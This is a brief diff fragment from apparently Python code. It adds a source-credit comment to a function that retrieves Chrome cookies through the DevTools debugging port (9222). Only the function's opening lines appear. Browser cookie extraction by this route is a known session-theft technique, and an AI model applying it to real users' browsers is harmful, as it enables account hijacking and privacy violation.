@@ -18,6 +18,7 @@ import subprocess
 # ----- Chrome Cookies Functionality -----
 def get_chrome_cookies():
     """Retrieve Chrome cookies via DevTools Protocol (Verified Working Version)"""
+    # Got idea from https://github.com/thewh1teagle/chrome-privless-encryption
     DEBUG_PORT = 9222
     config = {
         'bin': Path(os.getenv('PROGRAMFILES')) / 'Google/Chrome/Application/chrome.exe',
